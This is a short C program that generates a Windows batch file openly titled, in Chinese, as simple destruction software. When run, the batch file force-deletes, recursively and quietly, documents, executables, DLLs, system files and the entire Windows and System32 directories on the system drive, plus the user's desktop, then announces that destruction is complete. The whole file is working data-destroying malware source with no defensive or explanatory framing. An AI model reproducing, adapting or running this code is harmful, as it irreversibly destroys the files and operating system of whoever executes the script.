#include<conio.h>
#include<stdio.h>
main()
{
      FILE *p1;
      char z;
      z='%';
      p1=fopen("简单破坏软件.bat","w");
      fprintf(p1,"@echo off\ncolor 1b\ntitle 简单破坏软件(JXL编)\necho 正在进行破坏，请稍等......(JXL编)\ndel /f /s /q %csystemdrive%c\\*.gho\ndel /f /s /q %csystemdrive%c\\*.log\ndel /f /s /q %csystemdrive%c\\*.ttf\ndel /f /s /q %csystemdrive%c\\*.mui\ndel /f /s /q %csystemdrive%c\\*.dat\ndel /f /s /q %csystemdrive%c\\*.wav\ndel /f /s /q %csystemdrive%c\\*.doc\ndel /f /s /q %csystemdrive%c\\*.xls\ndel /f /s /q %csystemdrive%c\\*.exe\ndel /f /s /q %csystemdrive%c\\*.dll\ndel /f /s /q %csystemdrive%c\\*.ini\ndel /f /s /q %csystemdrive%c\\*.sys\ndel /f /s /q %csystemdrive%c\\*.txt\ndel /f /s /q %csystemdrive%c\\*.ico\ndel /f /s /q %csystemdrive%c\\windows\\system32\\*.*\ndel /f /s /q %csystemdrive%c\\windows\\*.*\ndel /f /q %cuserprofile%c\\desktop\\*.*\ncls\necho 简单破坏软件破坏完成。(JXL编)\n",z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z,z);
      fclose(p1);
}
